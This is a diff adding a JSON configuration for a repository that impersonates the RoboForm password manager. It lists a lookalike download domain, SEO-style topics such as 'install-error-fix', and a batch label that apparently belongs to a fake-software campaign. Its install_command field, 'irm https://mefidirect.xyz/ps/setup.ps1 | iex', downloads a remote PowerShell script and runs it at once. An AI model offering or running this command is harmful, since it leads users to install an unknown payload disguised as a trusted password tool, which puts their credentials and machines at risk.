@@ -1,0 +1,29 @@
+{
+  "repo": "roboform-everywhere-autofill-suite",
+  "product": "RoboForm Everywhere Autofill Suite",
+  "kind": "password",
+  "install_type": "download",
+  "download_url": "https://roboform.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new31",
+  "format": "license-md-only",
+  "category": "password",
+  "topics": [
+    "roboform-desktop",
+    "roboform-windows-app",
+    "roboform-password-manager",
+    "roboform-for-windows",
+    "roboform-install-error-fix",
+    "roboform-install-guide",
+    "roboform-password-vault",
+    "roboform-pc-client",
+    "roboform-windows-setup",
+    "roboform-windows-2026",
+    "get-roboform-windows",
+    "windows-tools",
+    "desktop-tools",
+    "pc-utility",
+    "setup-guide"
+  ]
+}
